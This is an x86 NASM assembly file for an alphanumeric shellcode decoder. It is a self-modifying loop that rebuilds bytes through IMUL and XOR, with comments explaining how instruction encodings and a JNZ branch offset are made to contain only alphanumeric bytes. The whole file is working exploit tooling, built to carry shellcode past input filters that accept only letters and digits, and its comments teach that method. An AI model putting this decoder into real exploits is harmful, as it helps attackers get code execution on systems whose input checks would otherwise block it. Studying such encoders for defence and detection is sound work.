BITS 32

; XOR [ESP], ESI and XOR ESI, [ESP] can be encoded in two ways, one of which is
; alphanumeric. NASM chooses the wrong one, which is why we have these:
%define xor_esp_esi db 0x31, 0x34, 0x64
%define xor_esi_esp db 0x33, 0x34, 0x64

start:
  XOR     [EDX], ESI              ; [ESI] = base address ^ ESI
  XOR     ESI, [EDX]              ; ESI = base address ^ ESI ^ ESI = base address
  PUSH    ESI                     ; [ESP0] = base address 
	POP     ECX                     ; ECX = [ESP0] = base address 

  PUSH    0x66666666
  ; IMUL  ESI, [ESP], 0x69
          db 0x6B, 0x34, 0x64, 0x69

esi_value equ -0x2A ; -Something

decode_loop:
	INC     ESI
	IMUL    EAX, [BYTE ECX + 2*ESI + jnz_marker + 1 - ((esi_value+1)*2)], BYTE 0x30
	XOR     AL,  [BYTE ECX + 2*ESI + jnz_marker + 2 - ((esi_value+1)*2)]
	XOR     [BYTE ECX + ESI + jnz_marker + 1 - (esi_value+1)], AL

jnz_marker:
; Jump back 0x10 bytes => F0, this must be encoded
; Assume byte1 is 0x4? and byte2 is 0x4?
; Working back: the offset is eventually stored by XORing over byte1, so the
; decoded value must be F0 ^ 4? => B?. Before that the value is XORed with
; byte2, so the value before this must be B? ^ 4? => F?. F0 can be created 
; using 0x?5 * 0x30 => 0xF0, so byte1 must be 0x45.
; Working back again, using the knowledge that byte1 must be 0x45: the offset is
; eventually stored by XORing over byte1, so the decoded value must be F0 ^ 45
; => B5. Before that the value is XORed with byte2 to and the result of that
; must be F0. B5 ^ F0 => 0x45, so byte2 must be 0x45 as well.

	db      0x75                    ; JNZ
	db      0x45                    ; high nibble of offset to decode_loop
	db      0x45                    ; low nibble of offset to decode_loop
